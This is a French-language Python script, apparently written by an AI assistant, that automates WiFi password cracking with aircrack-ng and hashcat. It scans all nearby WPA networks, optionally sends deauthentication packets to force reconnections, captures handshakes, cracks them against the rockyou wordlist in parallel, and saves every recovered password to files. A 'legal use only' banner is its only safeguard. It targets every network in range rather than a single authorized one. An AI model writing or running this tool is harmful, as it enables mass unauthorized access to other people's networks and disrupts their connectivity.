#!/usr/bin/env python3
"""
WiFi Security Tester - Version Optimisée avec Parallélisation
USAGE LÉGAL UNIQUEMENT - Environnements contrôlés avec autorisation

Auteur: Assistant de Recherche en Cybersécurité
Date: 2025-11-22
"""

import subprocess
import re
import os
import sys
import time
import argparse
import threading
import queue
import json
from datetime import datetime
from pathlib import Path
from multiprocessing import Pool, cpu_count
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Optional, Tuple

class Colors:
    """Codes couleur pour la sortie console"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WiFiSecurityTester:
    def __init__(self, interface="wlan0", wordlist_path="/usr/share/wordlists/rockyou.txt", 
                 use_hashcat=False, deauth_enabled=False):
        self.interface = interface
        self.wordlist_path = wordlist_path
        self.use_hashcat = use_hashcat
        self.deauth_enabled = deauth_enabled
        
        # Fichiers de sortie
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.results_file = f"wifi_cracked_{self.timestamp}.txt"
        self.json_results_file = f"wifi_results_{self.timestamp}.json"
        self.log_file = f"wifi_test_{self.timestamp}.log"
        
        # Répertoires
        self.capture_dir = Path("./captures")
        self.capture_dir.mkdir(exist_ok=True)
        
        # Résultats et locks
        self.results_lock = threading.Lock()
        self.results = []
        self.statistics = {
            'total_networks': 0,
            'handshakes_captured': 0,
            'passwords_cracked': 0,
            'start_time': None,
            'end_time': None
        }
    
    def log(self, message, level="INFO"):
        """Enregistre les messages dans le fichier log"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        
        with open(self.log_file, 'a') as f:
            f.write(log_entry)
    
    def print_colored(self, message, color=Colors.ENDC):
        """Affiche un message coloré"""
        print(f"{color}{message}{Colors.ENDC}")
    
    def check_root(self):
        """Vérifie les privilèges root"""
        if os.geteuid() != 0:
            self.print_colored("[!] Ce script nécessite les privilèges root", Colors.FAIL)
            self.print_colored("[*] Exécutez avec: sudo python3 wifi_security_tester.py", Colors.WARNING)
            sys.exit(1)
    
    def check_dependencies(self):
        """Vérifie la présence des outils nécessaires"""
        tools = {
            'airmon-ng': 'aircrack-ng',
            'airodump-ng': 'aircrack-ng',
            'aircrack-ng': 'aircrack-ng',
            'aireplay-ng': 'aircrack-ng'
        }
        
        if self.use_hashcat:
            tools['hashcat'] = 'hashcat'
        
        missing = []
        for tool, package in tools.items():
            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
                missing.append((tool, package))
        
        if missing:
            self.print_colored("[!] Outils manquants:", Colors.FAIL)
            for tool, package in missing:
                print(f"   - {tool} (installez: sudo apt install {package})")
            sys.exit(1)
        
        # Vérification de la wordlist
        if not os.path.exists(self.wordlist_path):
            self.print_colored(f"[!] Wordlist introuvable: {self.wordlist_path}", Colors.FAIL)
            
            if 'rockyou.txt.gz' in self.wordlist_path:
                self.print_colored("[*] Extraction de rockyou.txt...", Colors.WARNING)
                subprocess.run(['gunzip', '/usr/share/wordlists/rockyou.txt.gz'])
            else:
                sys.exit(1)
        
        self.print_colored("[+] Toutes les dépendances sont installées", Colors.OKGREEN)
        self.log("Dépendances vérifiées avec succès")
    
    def enable_monitor_mode(self):
        """Active le mode monitor sur l'interface"""
        self.print_colored(f"[*] Activation du mode monitor sur {self.interface}...", Colors.OKCYAN)
        
        # Arrêt des processus qui pourraient interférer
        subprocess.run(['airmon-ng', 'check', 'kill'], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Activation du mode monitor
        result = subprocess.run(['airmon-ng', 'start', self.interface], 
                               capture_output=True, text=True)
        
        # Détection du nouveau nom d'interface
        if 'mon' in result.stdout:
            self.interface = self.interface + 'mon' if 'mon' not in self.interface else self.interface
            self.print_colored(f"[+] Mode monitor activé: {self.interface}", Colors.OKGREEN)
            self.log(f"Mode monitor activé sur {self.interface}")
            return True
        else:
            self.print_colored("[!] Échec de l'activation du mode monitor", Colors.FAIL)
            self.print_colored("[*] Vérifiez que l'interface existe avec: iwconfig", Colors.WARNING)
            self.log("Échec de l'activation du mode monitor", "ERROR")
            return False
    
    def scan_networks(self, duration=30):
        """Scanne les réseaux WiFi disponibles"""
        self.print_colored(f"\n[*] Scan des réseaux pendant {duration} secondes...", Colors.OKCYAN)
        self.print_colored("[*] Veuillez patienter...", Colors.WARNING)
        
        scan_file = self.capture_dir / "scan"
        
        # Lancement d'airodump-ng
        proc = subprocess.Popen(
            ['airodump-ng', self.interface, '-w', str(scan_file), 
             '--output-format', 'csv', '--band', 'abg'],  # Scan toutes les bandes
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Barre de progression
        for i in range(duration):
            time.sleep(1)
            progress = int((i + 1) / duration * 50)
            bar = '█' * progress + '░' * (50 - progress)
            print(f"\r[{bar}] {i+1}/{duration}s", end='', flush=True)
        
        print()  # Nouvelle ligne
        proc.terminate()
        proc.wait()
        
        # Lecture des résultats
        csv_file = str(scan_file) + "-01.csv"
        networks = self.parse_airodump_csv(csv_file)
        
        self.statistics['total_networks'] = len(networks)
        
        return networks
    
    def parse_airodump_csv(self, csv_file):
        """Parse le fichier CSV d'airodump-ng"""
        networks = []
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            lines = content.split('\n')
            ap_section = []
            in_ap_section = False
            
            for line in lines:
                if 'BSSID' in line and 'PWR' in line:
                    in_ap_section = True
                    continue
                if in_ap_section and line.strip() == '':
                    break
                if in_ap_section:
                    ap_section.append(line)
            
            for line in ap_section:
                parts = [p.strip() for p in line.split(',')]
                
                if len(parts) < 14:
                    continue
                
                bssid = parts[0]
                power = parts[3]
                channel = parts[5]
                encryption = parts[7]
                essid = parts[13]
                
                # Filtrer uniquement WPA/WPA2/WPA3
                if 'WPA' in encryption and essid:
                    try:
                        power_int = int(power)
                    except:
                        power_int = -100
                    
                    networks.append({
                        'bssid': bssid,
                        'essid': essid,
                        'channel': channel,
                        'power': power_int,
                        'encryption': encryption
                    })
        
        except Exception as e:
            self.print_colored(f"[!] Erreur lors du parsing: {e}", Colors.FAIL)
            self.log(f"Erreur parsing CSV: {e}", "ERROR")
        
        # Tri par puissance du signal (plus fort en premier)
        networks.sort(key=lambda x: x['power'], reverse=True)
        
        return networks
    
    def deauth_attack(self, bssid, channel, duration=10):
        """Envoie des paquets de déauthentification pour forcer la reconnexion"""
        self.print_colored(f"[*] Attaque de déauth sur {bssid} pendant {duration}s...", Colors.WARNING)
        
        try:
            # Changement de canal
            subprocess.run(['iwconfig', self.interface, 'channel', channel],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Envoi des paquets de déauth
            subprocess.run(
                ['aireplay-ng', '--deauth', str(duration), '-a', bssid, self.interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=duration + 5
            )
            
            self.log(f"Déauth effectué sur {bssid}")
        
        except subprocess.TimeoutExpired:
            self.print_colored("[!] Timeout lors de l'attaque de déauth", Colors.FAIL)
        except Exception as e:
            self.print_colored(f"[!] Erreur lors du déauth: {e}", Colors.FAIL)
    
    def capture_handshake(self, network, timeout=120):
        """Capture le handshake WPA pour un réseau donné"""
        essid_safe = network['essid'].replace(' ', '_').replace('/', '_')
        capture_file = self.capture_dir / essid_safe
        
        self.print_colored(f"\n[*] Capture du handshake: {network['essid']}", Colors.OKCYAN)
        self.print_colored(f"    BSSID: {network['bssid']}", Colors.OKCYAN)
        self.print_colored(f"    Canal: {network['channel']}", Colors.OKCYAN)
        self.print_colored(f"    Signal: {network['power']} dBm", Colors.OKCYAN)
        
        # Lancement de la capture
        proc = subprocess.Popen(
            ['airodump-ng', '--bssid', network['bssid'], 
             '-c', network['channel'], '-w', str(capture_file),
             '--output-format', 'cap', self.interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Thread de déauth si activé
        deauth_thread = None
        if self.deauth_enabled:
            time.sleep(3)  # Attendre 3s avant de commencer le déauth
            deauth_thread = threading.Thread(
                target=self.deauth_attack, 
                args=(network['bssid'], network['channel'], 10),
                daemon=True
            )
            deauth_thread.start()
        
        # Attente de la capture du handshake
        start_time = time.time()
        handshake_captured = False
        
        self.print_colored(f"[*] Attente du handshake (max {timeout}s)...", Colors.WARNING)
        
        check_interval = 5
        checks = 0
        
        while time.time() - start_time < timeout:
            time.sleep(check_interval)
            checks += 1
            
            # Vérification si handshake capturé
            cap_file = str(capture_file) + '-01.cap'
            
            if not os.path.exists(cap_file):
                continue
            
            check = subprocess.run(
                ['aircrack-ng', cap_file],
                capture_output=True,
                text=True
            )
            
            if 'handshake' in check.stdout.lower() or '1 handshake' in check.stdout:
                handshake_captured = True
                self.print_colored(f"[+] Handshake capturé pour {network['essid']}! ({checks * check_interval}s)", 
                                 Colors.OKGREEN)
                self.log(f"Handshake capturé: {network['essid']}")
                break
            
            # Afficher la progression
            elapsed = int(time.time() - start_time)
            print(f"\r    Progression: {elapsed}/{timeout}s", end='', flush=True)
        
        print()  # Nouvelle ligne
        proc.terminate()
        proc.wait()
        
        if deauth_thread:
            deauth_thread.join(timeout=2)
        
        if handshake_captured:
            self.statistics['handshakes_captured'] += 1
            return str(capture_file) + '-01.cap'
        else:
            self.print_colored(f"[-] Pas de handshake capturé pour {network['essid']}", Colors.FAIL)
            self.log(f"Échec capture handshake: {network['essid']}", "WARNING")
            return None
    
    def crack_password_aircrack(self, capture_file, essid):
        """Cracking avec aircrack-ng"""
        self.print_colored(f"[*] Crack aircrack-ng: {essid}...", Colors.OKCYAN)
        
        try:
            result = subprocess.run(
                ['aircrack-ng', '-w', self.wordlist_path, '-b', '-', capture_file],
                capture_output=True,
                text=True,
                timeout=600  # 10 minutes max
            )
            
            password_match = re.search(r'KEY FOUND! \[ (.+?) \]', result.stdout)
            
            if password_match:
                password = password_match.group(1)
                return password
            
            return None
        
        except subprocess.TimeoutExpired:
            self.print_colored(f"[!] Timeout lors du crack de {essid}", Colors.WARNING)
            return None
        except Exception as e:
            self.print_colored(f"[!] Erreur lors du crack: {e}", Colors.FAIL)
            return None
    
    def crack_password_hashcat(self, capture_file, essid):
        """Cracking avec hashcat (GPU-accéléré)"""
        self.print_colored(f"[*] Crack hashcat (GPU): {essid}...", Colors.OKCYAN)
        
        try:
            # Conversion cap → hccapx
            hccapx_file = capture_file.replace('.cap', '.hccapx')
            
            subprocess.run(
                ['aircrack-ng', capture_file, '-J', hccapx_file.replace('.hccapx', '')],
                capture_output=True,
                timeout=30
            )
            
            if not os.path.exists(hccapx_file):
                self.print_colored("[!] Échec de conversion vers hccapx", Colors.FAIL)
                return None
            
            # Cracking avec hashcat
            result = subprocess.run(
                ['hashcat', '-m', '2500', hccapx_file, self.wordlist_path, 
                 '--force', '--status', '--status-timer=10'],
                capture_output=True,
                text=True,
                timeout=600
            )
            
            # Recherche du mot de passe
            if result.returncode == 0:
                # Afficher les résultats
                show_result = subprocess.run(
                    ['hashcat', '-m', '2500', hccapx_file, '--show'],
                    capture_output=True,
                    text=True
                )
                
                if show_result.stdout:
                    # Format: hash:essid:password
                    match = re.search(r':([^:]+)$', show_result.stdout.strip())
                    if match:
                        return match.group(1)
            
            return None
        
        except subprocess.TimeoutExpired:
            self.print_colored(f"[!] Timeout lors du crack hashcat de {essid}", Colors.WARNING)
            return None
        except Exception as e:
            self.print_colored(f"[!] Erreur hashcat: {e}", Colors.FAIL)
            return None
    
    def crack_password(self, capture_file, essid):
        """Wrapper pour choisir la méthode de cracking"""
        start_time = time.time()
        
        if self.use_hashcat:
            password = self.crack_password_hashcat(capture_file, essid)
        else:
            password = self.crack_password_aircrack(capture_file, essid)
        
        elapsed_time = time.time() - start_time
        
        if password:
            self.print_colored(f"[+] MOT DE PASSE TROUVÉ: {password} ({elapsed_time:.1f}s)", 
                             Colors.OKGREEN + Colors.BOLD)
            self.log(f"Password trouvé pour {essid}: {password} (temps: {elapsed_time:.1f}s)")
            self.statistics['passwords_cracked'] += 1
            return password
        else:
            self.print_colored(f"[-] Mot de passe non trouvé pour {essid} ({elapsed_time:.1f}s)", 
                             Colors.FAIL)
            self.log(f"Échec crack: {essid} (temps: {elapsed_time:.1f}s)", "WARNING")
            return None
    
    def save_result(self, essid, password, power, bssid, encryption):
        """Sauvegarde le résultat de manière thread-safe"""
        with self.results_lock:
            self.results.append({
                'essid': essid,
                'password': password,
                'power': power,
                'bssid': bssid,
                'encryption': encryption,
                'timestamp': datetime.now().isoformat()
            })
    
    def write_results_to_file(self):
        """Écrit tous les résultats triés dans les fichiers"""
        # Tri par puissance du signal (décroissant)
        self.results.sort(key=lambda x: x['power'], reverse=True)
        
        # Fichier texte formaté
        with open(self.results_file, 'w', encoding='utf-8') as f:
            f.write("="*80 + "\n")
            f.write("           RÉSULTATS DU TEST DE SÉCURITÉ WIFI\n")
            f.write("="*80 + "\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Réseaux testés: {self.statistics['total_networks']}\n")
            f.write(f"Handshakes capturés: {self.statistics['handshakes_captured']}\n")
            f.write(f"Mots de passe crackés: {self.statistics['passwords_cracked']}\n")
            f.write("="*80 + "\n\n")
            
            for result in self.results:
                f.write(f"{result['essid']} ----------- {result['password']}\n")
                f.write(f"  Signal: {result['power']} dBm | BSSID: {result['bssid']} | {result['encryption']}\n\n")
        
        # Fichier JSON pour traitement ultérieur
        with open(self.json_results_file, 'w', encoding='utf-8') as f:
            json.dump({
                'statistics': self.statistics,
                'results': self.results
            }, f, indent=2, ensure_ascii=False)
        
        self.print_colored(f"\n[+] Résultats sauvegardés:", Colors.OKGREEN)
        self.print_colored(f"    - {self.results_file}", Colors.OKGREEN)
        self.print_colored(f"    - {self.json_results_file}", Colors.OKGREEN)
        self.print_colored(f"    - {self.log_file}", Colors.OKGREEN)
    
    def disable_monitor_mode(self):
        """Désactive le mode monitor"""
        self.print_colored(f"\n[*] Désactivation du mode monitor...", Colors.OKCYAN)
        
        interface_base = self.interface.replace('mon', '')
        subprocess.run(['airmon-ng', 'stop', self.interface],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Redémarrage de NetworkManager
        subprocess.run(['systemctl', 'start', 'NetworkManager'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        self.log("Mode monitor désactivé")
    
    def test_network_sequential(self, network):
        """Test un réseau (capture + crack) - pour usage séquentiel"""
        self.print_colored(f"\n{'='*80}", Colors.HEADER)
        self.print_colored(f"  TEST DU RÉSEAU: {network['essid']}", Colors.HEADER + Colors.BOLD)
        self.print_colored(f"{'='*80}", Colors.HEADER)
        
        capture_file = self.capture_handshake(network, timeout=120)
        
        if capture_file:
            password = self.crack_password(capture_file, network['essid'])
            
            if password:
                self.save_result(network['essid'], password, network['power'], 
                               network['bssid'], network['encryption'])
                return True
        
        return False
    
    def test_network_cracking_only(self, network, capture_file):
        """Test SEULEMENT le cracking (pour parallélisation CPU)"""
        password = self.crack_password(capture_file, network['essid'])
        
        if password:
            self.save_result(network['essid'], password, network['power'],
                           network['bssid'], network['encryption'])
            return (network['essid'], password, True)
        
        return (network['essid'], None, False)
    
    def display_networks_table(self, networks):
        """Affiche un tableau des réseaux détectés"""
        self.print_colored(f"\n[+] {len(networks)} réseaux WPA/WPA2/WPA3 détectés:", Colors.OKGREEN + Colors.BOLD)
        self.print_colored("="*100, Colors.OKBLUE)
        
        header = f"{'#':<4} {'ESSID':<30} {'BSSID':<20} {'Canal':<7} {'Signal':<10} {'Chiffrement':<20}"
        self.print_colored(header, Colors.BOLD)
        self.print_colored("="*100, Colors.OKBLUE)
        
        for i, net in enumerate(networks, 1):
            # Couleur selon la force du signal
            if net['power'] >= -50:
                signal_color = Colors.OKGREEN
            elif net['power'] >= -70:
                signal_color = Colors.WARNING
            else:
                signal_color = Colors.FAIL
            
            line = f"{i:<4} {net['essid']:<30} {net['bssid']:<20} {net['channel']:<7} "
            print(line, end='')
            print(f"{signal_color}{net['power']} dBm{Colors.ENDC:<10}", end='')
            print(f" {net['encryption']:<20}")
        
        self.print_colored("="*100, Colors.OKBLUE)
    
    # ============= MODES D'EXÉCUTION =============
    
    def run_sequential(self, scan_duration=30):
        """Mode séquentiel: un réseau après l'autre"""
        self.print_colored("\n[*] Mode: SÉQUENTIEL (un réseau à la fois)", Colors.OKCYAN + Colors.BOLD)
        
        self.statistics['start_time'] = datetime.now().isoformat()
        
        try:
            networks = self.scan_networks(duration=scan_duration)
            
            if not networks:
                self.print_colored("[!] Aucun réseau WPA/WPA2/WPA3 détecté", Colors.WARNING)
                return
            
            self.display_networks_table(networks)
            
            for i, network in enumerate(networks, 1):
                self.print_colored(f"\n[*] Traitement du réseau {i}/{len(networks)}", Colors.HEADER)
                self.test_network_sequential(network)
            
        except KeyboardInterrupt:
            self.print_colored("\n[!] Interruption par l'utilisateur", Colors.WARNING)
        
        finally:
            self.statistics['end_time'] = datetime.now().isoformat()
            self.display_summary()
    
    def run_parallel_capture_and_crack(self, scan_duration=30, num_workers=None):
        """
        Mode parallélisé RECOMMANDÉ:
        1. Capture tous les handshakes (séquentiel)
        2. Crack tous les réseaux en parallèle (multi-threading)
        """
        if num_workers is None:
            num_workers = max(1, cpu_count() - 1)
        
        self.print_colored(f"\n[*] Mode: CAPTURE → CRACK PARALLÉLISÉ ({num_workers} workers)", 
                         Colors.OKCYAN + Colors.BOLD)
        
        self.statistics['start_time'] = datetime.now().isoformat()
        
        try:
            # PHASE 1: Scan
            networks = self.scan_networks(duration=scan_duration)
            
            if not networks:
                self.print_colored("[!] Aucun réseau WPA/WPA2/WPA3 détecté", Colors.WARNING)
                return
            
            self.display_networks_table(networks)
            
            # PHASE 2: Capture de tous les handshakes
            self.print_colored(f"\n{'='*80}", Colors.HEADER)
            self.print_colored("  PHASE 1: CAPTURE DES HANDSHAKES", Colors.HEADER + Colors.BOLD)
            self.print_colored(f"{'='*80}", Colors.HEADER)
            
            captured_networks = []
            
            for i, network in enumerate(networks, 1):
                self.print_colored(f"\n[*] Capture {i}/{len(networks)}", Colors.OKCYAN)
                capture_file = self.capture_handshake(network, timeout=120)
                
                if capture_file:
                    captured_networks.append((network, capture_file))
            
            if not captured_networks:
                self.print_colored("\n[!] Aucun handshake capturé", Colors.FAIL)
                return
            
            self.print_colored(f"\n[+] {len(captured_networks)} handshakes capturés avec succès!", 
                             Colors.OKGREEN + Colors.BOLD)
            
            # PHASE 3: Crack parallélisé
            self.print_colored(f"\n{'='*80}", Colors.HEADER)
            self.print_colored(f"  PHASE 2: CRACK PARALLÉLISÉ ({num_workers} WORKERS)", 
                             Colors.HEADER + Colors.BOLD)
            self.print_colored(f"{'='*80}", Colors.HEADER)
            
            with ThreadPoolExecutor(max_workers=num_workers) as executor:
                futures = {
                    executor.submit(self.test_network_cracking_only, network, capture_file): (network, i)
                    for i, (network, capture_file) in enumerate(captured_networks, 1)
                }
                
                completed = 0
                total = len(captured_networks)
                
                for future in as_completed(futures):
                    network, idx = futures[future]
                    essid, password, success = future.result()
                    completed += 1
                    
                    progress = int(completed / total * 50)
                    bar = '█' * progress + '░' * (50 - progress)
                    
                    if success:
                        self.print_colored(f"\r[{bar}] {completed}/{total} - {essid}: CRACKÉ ✓", 
                                         Colors.OKGREEN)
                    else:
                        print(f"\r[{bar}] {completed}/{total} - {essid}: Échec ✗")
        
        except KeyboardInterrupt:
            self.print_colored("\n[!] Interruption par l'utilisateur", Colors.WARNING)
        
        finally:
            self.statistics['end_time'] = datetime.now().isoformat()
            self.display_summary()
    
    def display_summary(self):
        """Affiche le résumé des résultats"""
        self.print_colored(f"\n{'='*80}", Colors.HEADER)
        self.print_colored("  RÉSUMÉ DES TESTS", Colors.HEADER + Colors.BOLD)
        self.print_colored(f"{'='*80}", Colors.HEADER)
        
        print(f"\nRéseaux détectés:        {self.statistics['total_networks']}")
        print(f"Handshakes capturés:     {self.statistics['handshakes_captured']}")
        
        if self.statistics['handshakes_captured'] > 0:
            success_rate = (self.statistics['passwords_cracked'] / 
                          self.statistics['handshakes_captured'] * 100)
            
            self.print_colored(f"Mots de passe crackés:   {self.statistics['passwords_cracked']} "
                             f"({success_rate:.1f}%)", Colors.OKGREEN + Colors.BOLD)
        else:
            print(f"Mots de passe crackés:   0")
        
        if self.statistics['start_time'] and self.statistics['end_time']:
            start = datetime.fromisoformat(self.statistics['start_time'])
            end = datetime.fromisoformat(self.statistics['end_time'])
            duration = (end - start).total_seconds()
            
            minutes = int(duration // 60)
            seconds = int(duration % 60)
            print(f"Durée totale:            {minutes}m {seconds}s")
        
        if self.results:
            self.print_colored(f"\n{'='*80}", Colors.OKGREEN)
            self.print_colored("  RÉSEAUX CRACKÉS (par ordre de puissance du signal)", 
                             Colors.OKGREEN + Colors.BOLD)
            self.print_colored(f"{'='*80}", Colors.OKGREEN)
            
            for i, result in enumerate(self.results, 1):
                self.print_colored(f"\n{i}. {result['essid']}", Colors.BOLD)
                self.print_colored(f"   Mot de passe: {result['password']}", Colors.OKGREEN)
                print(f"   BSSID: {result['bssid']}")
                print(f"   Signal: {result['power']} dBm")
                print(f"   Chiffrement: {result['encryption']}")
        
        self.print_colored(f"\n{'='*80}", Colors.HEADER)


def parse_args():
    parser = argparse.ArgumentParser(
        description='WiFi Security Tester Optimisé - USAGE LÉGAL UNIQUEMENT',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:

  # Mode séquentiel (par défaut)
  sudo python3 %(prog)s -i wlan0 -t 30

  # Mode parallélisé avec hashcat (RECOMMANDÉ)
  sudo python3 %(prog)s -m parallel -i wlan0 -t 45 --hashcat --workers 4

  # Mode avec déauth activé
  sudo python3 %(prog)s -m parallel --deauth -t 60

  # Utiliser une wordlist personnalisée
  sudo python3 %(prog)s -w custom_wordlist.txt -t 30
        """
    )
    
    parser.add_argument('-i', '--interface', default='wlan0',
                       help='Interface WiFi (défaut: wlan0)')
    
    parser.add_argument('-w', '--wordlist', 
                       default='/usr/share/wordlists/rockyou.txt',
                       help='Chemin vers la wordlist')
    
    parser.add_argument('-t', '--scan-time', type=int, default=30,
                       help='Durée du scan en secondes (défaut: 30)')
    
    parser.add_argument('-m', '--mode', 
                       choices=['sequential', 'parallel'],
                       default='sequential',
                       help='Mode d\'exécution (défaut: sequential)')
    
    parser.add_argument('--workers', type=int, default=None,
                       help='Nombre de workers parallèles (défaut: CPU-1)')
    
    parser.add_argument('--hashcat', action='store_true',
                       help='Utiliser hashcat au lieu d\'aircrack-ng (plus rapide)')
    
    parser.add_argument('--deauth', action='store_true',
                       help='Activer l\'attaque de déauthentification')
    
    parser.add_argument('-o', '--output', default=None,
                       help='Préfixe personnalisé pour les fichiers de sortie')
    
    return parser.parse_args()


def main():
    """Fonction principale"""
    args = parse_args()
    
    # Banner
    print(f"{Colors.HEADER}{'='*80}")
    print(f"{Colors.BOLD}    WiFi Security Tester - Version Optimisée avec Parallélisation")
    print(f"    USAGE LÉGAL UNIQUEMENT - Environnements contrôlés{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
    
    # Initialisation du testeur
    tester = WiFiSecurityTester(
        interface=args.interface,
        wordlist_path=args.wordlist,
        use_hashcat=args.hashcat,
        deauth_enabled=args.deauth
    )
    
    # Personnalisation des fichiers de sortie
    if args.output:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        tester.results_file = f"{args.output}_{timestamp}.txt"
        tester.json_results_file = f"{args.output}_{timestamp}.json"
        tester.log_file = f"{args.output}_{timestamp}.log"
    
    # Vérifications préliminaires
    tester.check_root()
    tester.check_dependencies()
    
    # Activation du mode monitor
    if not tester.enable_monitor_mode():
        sys.exit(1)
    
    try:
        # Exécution selon le mode choisi
        if args.mode == 'sequential':
            tester.run_sequential(scan_duration=args.scan_time)
        
        elif args.mode == 'parallel':
            tester.run_parallel_capture_and_crack(
                scan_duration=args.scan_time,
                num_workers=args.workers
            )
    
    finally:
        # Nettoyage
        tester.disable_monitor_mode()
        tester.write_results_to_file()
        
        print(f"\n{Colors.OKGREEN}[+] Test terminé avec succès!{Colors.ENDC}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Programme interrompu par l'utilisateur{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Erreur fatale: {e}{Colors.ENDC}")
        sys.exit(1)
